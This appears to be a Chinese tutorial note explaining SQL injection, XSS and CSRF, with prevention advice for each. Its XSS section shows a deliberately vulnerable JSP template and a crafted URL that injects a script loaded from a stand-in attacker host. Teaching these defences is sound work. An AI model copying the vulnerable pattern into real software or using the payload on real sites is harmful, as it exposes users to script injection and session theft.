现代黑客攻击的特点是分布式,高流量,深度匿名;由于国外大量"肉鸡"没有登记,所以国外的服务器遭遇DDOS攻击时,无法有效地防御;

所以互联网企业都要建立一套完整的信息安全体系,遵循CIA原则:`保密性(Confidentiality)`,`完整性(Integrity)`,`可用性(Availability)`;

针对现在Web安全而言,有三种安全问题也是围绕三点出发的;

## `SQL注入`

`SQL注入`是注入式攻击中的常见类型.

`SQL注入`攻击时未将代码与数据进行严格的隔离,导致在读取用户数据的时候,错误地把数据作为代码的一部分执行,从而导致一些安全问题.

如何预防?

+ 过滤用户输入参数中的特殊字符,从而降低被SQL注入的风险;
+ 禁止通过字符串拼接的SQL语句,严格使用参数绑定传入的SQL参数;
+ 合理使用数据库访问框架提供的防注入机制.
  + `MyBatis`提供的`#{}`绑定参数,从而防止SQL注入;
  + 慎用`${}`,其相当于使用字符串拼接SQL


## `XSS`

跨站脚本攻击,即`Cross-Site Scripting`,为了不和前端开发中层叠样式表(CSS)的名字冲突,简称为`XSS`;

`XSS`是指黑客通过技术手段,向正常用户请求的HTML页面中插入恶意脚本,从而可以执行任意脚本.
+ `反射型XSS`
+ `存储型XSS`
+ `DOM型XSS`

从技术原理上,后端开发人员,前端开发人员都有可能造成`XSS`漏洞,比如下面的模板文件就可能导致反射型`XSS`:

```
<div>
	<h3>反射型XSS示例</h3>
	<br>用户 : <%= request.getParameter("userName") %>
	<br>系统错误信息 : <%= request.getParameter("errorMessage") %>
</div>
```

上面的代码从HTTP请求中取了`userName`和`errorMessage`两个参数,并直接输出到HTML中用于展示,当黑客构造如下的URL时就出现了反射型XSS,用户浏览器就可以执行黑客的JavaScript脚本;

```
http://xss.demo/self-xss.jsp?userName=XXX<script>alert("XX")</script>&errorMessage=XSS<script src=http://hacker.demo/xss-script.js/>
```

在防范`XSS`上,主要通过对用户输入数据做过滤或者转义.比如Java开发人员可以使用Jsoup框架对用户输入字符串做`XSS`过滤,或者使用框架提供的工具类对用户输入的字符串做HTML转义;

## `CSRF`

跨站请求伪造(Cross-Site Request Forgery),简称`CSRF`,也被称为`One-click Attack`,即在用户不知情的情况下,冒充用户发起请求,在当前已经登录的Web应用程序上执行恶意操作,如果恶意发帖,修改密码,发邮件等;

`CSRF`与`XSS`,从攻击的效果上,两者有重合的地方.

从技术原理上两者有本质不同:
+ `XSS`是在正常用户请求的HTML页面中执行了黑客提供的恶意代码;
+ `CSRF`是黑客直接盗用用户浏览器中登录信息,冒充用户去执行黑客指定的操作.

**`XSS`问题出现用户数据没有过滤,转义;`CSRF`问题出在HTTP接口没有防范不受信任调用;**

防范`CSRF`漏洞主要通过以下方式:
+ `CSRF Token`验证,利用浏览器的同源限制,在`HTTP`接口执行前验证页面或者`Cookie`中设置的`Token`,只有验证通过才继续执行请求;
+ 人机交互,比如在调用上述网上银行转账接口时校验短信验证码;

